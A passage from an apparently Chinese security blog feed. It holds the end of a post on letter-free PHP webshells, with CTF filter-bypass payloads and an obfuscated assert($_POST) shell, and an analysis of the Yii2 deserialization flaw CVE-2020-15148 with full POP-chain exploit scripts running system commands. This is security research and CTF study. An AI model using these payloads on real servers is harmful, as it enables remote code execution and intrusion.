class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++; &#x2F;&#x2F; E </span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure><h2 id="0x04-回到最开始的那道题">0x04 回到最开始的那道题</h2><h3 id="异或方法">异或方法</h3><p>前面提到过<code>_GET</code>也可以这样拼接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;; &#x2F;&#x2F; $__&#x3D;&quot;_GET&quot;;</span><br></pre></td></tr></table></figure><p>按照这种方法，可以得到一种payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]();&amp;_&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>即<code>$&#123;$_&#125;[_]()</code> = <code>$_GET[_]()</code>，url传入<code>_=getFlag</code></p><blockquote><p>本文的后面解释了<code>$&#123;$_&#125;[_]()</code>中的<code>&#123;&#125;</code>的作用</p></blockquote><p>还有两种更直接的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    &#x2F;&#x2F;$_&#x3D;&#39;getFlag&#39;</span><br><span class="line">?code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure><p>相当于 <code>$啊=getFlag;$啊();</code></p><h3 id="取反方法">取反方法</h3><p>前面也提到过<code>$_GET</code>还有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code></p><p>那么利用这种方式可得payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_(); &#x2F;&#x2F;%_为getFlag取反然后URL编码得结果</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>其中：<code>%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$_GET['+']</code></p><h2 id="0x05-进一步思考">0x05 进一步思考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在上面一道题的基础上，又过滤了下划线<code>_</code>，意味着不能定义变量，而且也构造不出来数字。</p><p>首先看一个错误的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(&#39;$&#39;).(&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;).([&#39;+&#39;])&amp;+&#x3D;getFlag();</span><br></pre></td></tr></table></figure><p>错误的原因是<strong>eval只能解析一遍代码，所以如果写的是a.b这样的字符串拼接，就只会执行这个拼接，并不会去执行代码</strong>。</p><p>例如：</p><p><code>eval($_GET['b'])</code> url里面 <code>b=phpinfo();</code> 这时候相当于<code>eval('phpinfo();')</code><br><code>eval($_GET['b'])</code> url里面<code>b=$_GET[c]&amp;c=phpinfo();</code> 相当于<code>eval('$_GET[c]')</code><br>上面的payload是<code>code=$_GET['+']&amp;+=getFlag();</code> ，也就是<code>eval('$_GET['+'])</code>并不会执行<code>getFlag();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;12354&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">&quot;getflag&quot;</span>;</span><br><span class="line">$b=<span class="string">&quot;()&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>($a.$b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码不会输出任何结果。</p><p>正确的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>这里利用了<code>$&#123;&#125;</code>中的代码是可以执行的特点，其实也就是可变变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; &#39;hello&#39;;</span><br><span class="line">    $$a &#x3D; &#39;world&#39;;</span><br><span class="line">    echo &quot;$a $&#123;$a&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出<code>hello world</code>，<code>$&#123;$a&#125;</code>，括号中的<code>$a</code>是可以执行的，变成了hello。</p><blockquote><p>这也解释上面提到的为什么要加上<code>&#123;&#125;</code></p></blockquote><p>还可以使用取反的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>其中<code>24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code> = <code>$_GET</code></p><blockquote><p>~在{}中执行了取反操作</p></blockquote><p>另外上面提到过的一个payload仍然还是可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure><p>这里就不需要用{}了，因为异或的值直接被当作字符串赋值给了$啊。</p><h2 id="0x06-最后的思考">0x06 最后的思考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">    die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint&#x3D;&quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题进一步的过滤了<code>$</code>字符。</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? ????.???&#96;?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>前提是在Linux系统中</p></blockquote><p>首先<code>?&gt;</code>闭合php文件开头的<code>&lt;?php</code>，<code>&lt;?=</code>可以输出。</p><p><code>&lt;? ?&gt;</code>是短标签，<code>&lt;?php ?&gt;</code>是长标签。在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>同时，只有开启这个才可以使用 <code>&lt;?=&gt;</code>以代替 <code>&lt;? echo</code> 。</p><p>另外，在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用<code>? * %</code>等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：</p><p><code>/???/???</code>通配``/bin/cat<code>，</code>???.???<code>通配</code>flag.php`</p><h2 id="0x07-Reference">0x07 Reference</h2><p><a href="https://www.moonback.xyz/2019/10/16/nowords-webshell/">https://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p><p>[php不使用数字字母和下划线写shell](</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP无数字字母构造webshell&quot;&gt;PHP无数字字母构造webshell&lt;/h1&gt;
&lt;h2 id=&quot;0x01-从一道题目出发&quot;&gt;0x01 从一道题目出发&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="web安全基础" scheme="http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Yii2反序列化漏洞分析及拓展</title>
    <link href="http://ca0y1h.top/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/"/>
    <id>http://ca0y1h.top/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</id>
    <published>2020-10-08T15:15:40.000Z</published>
    <updated>2020-10-08T15:20:01.868Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-15148-Yii2-反序列化分析及拓展">CVE-2020-15148 Yii2 反序列化分析及拓展</h1><h2 id="漏洞范围">漏洞范围</h2><ul><li>Yii2 &lt; 2.0.38</li></ul><h2 id="环境安装">环境安装</h2><p>这里直接选择去GitHub官方仓库拉取Yii2的源代码：</p><p><a href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210340.png" alt=""></p><p>下载到本地后解压到web目录，修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210528.png" alt=""></p><p>再在Controller添加一个反序列化的入口代码：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210912.png" style="zoom:50%;" /><p>MacOS下用MAMP搭建PHP调试环境，测试一下：</p><blockquote><p>搭建教程：<a href="https://www.sqlsec.com/2020/07/macphp.html">https://www.sqlsec.com/2020/07/macphp.html</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006211613.png" alt=""></p><p>验证成功，开始审计。</p><h2 id="漏洞分析">漏洞分析</h2><p>根据现有的资料，反序列化的起点是在<code>yii\db\BatchQueryResult</code>类中，文件位置<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007211913.png" alt=""></p><p><code>__destruct()</code>函数调用了<code>reset()</code>方法，<code>reset()</code>方法中的<code>_dataReader</code>参数是可控的，并且调用了该参数的<code>close()</code>函数，那么此处就可以作为跳板，去执行其他类中的<code>__call()</code>函数，全局查找关键字<code>function __call</code>：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224238.png" style="zoom:50%;" /><p>一共有找到16个<code>__call()</code>函数，那就一个一个的分析下来，其中Codeception组件中多数是直接抛出异常，没有可利用的地方，但是<code>Faker\Generator</code>类是可以成为POP链的。具体代码位于：<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><p>首先<code>__call()</code>函数中调用了<code>format()</code>方法：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224606.png" style="zoom:50%;" /><p>接着跟下去<code>format()</code>方法，参数<code>$method</code>和<code>$attributes</code>都是不可控的：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224816.png" alt=""></p><p>在<code>format()</code>方法内部，使用回调函数<code>call_user_func_array()</code>调用了<code>getFormatter()</code>方法。在该方法中，我们只关心第一个if语句，</p><p>由于<code>$this-&gt;formatter</code>是我们可控的，所以这里就可以调用任意类中的任意方法了。但是上面提到过，此时<code>$formatter='close'</code>而<code>$arguments</code>为空，也就是说<code>call_user_func_array()</code>这个函数的第一个参数可控，第二个参数为空。说的更透彻一点，要寻找的就是可以实现RCE的任意一个方法，并且参数是类的成员变量！</p><p>同样的，这里我们用<code>call_user_func()</code>去实现RCE，用正则表达式<code>call_user_func(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)\)</code>去匹配参数的限制，全局搜索：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231112.png" style="zoom:50%;" /><p><code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>都可以实现上述条件下的RCE：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231243.png" alt=""></p><p>那么整个POP链也就清楚了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure><h2 id="编写EXP">编写EXP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007233404.png" alt=""></p><h2 id="继续挖掘">继续挖掘</h2><p>新版本的<code>BatchQueryResult</code>类已经无法反序列化了，那就全局搜索<code>__destruct()</code>函数，然后一个个的排查。</p><h3 id="第一条POP链">第一条POP链</h3><p>触发点位于<code>vendor\codeception\codeception\ext\RunProcess.php</code>，POP链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $process;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;process = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第二条POP链">第二条POP链</h3><p>触发点位于<code>vendor\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>，POP链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\Deprecated.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span 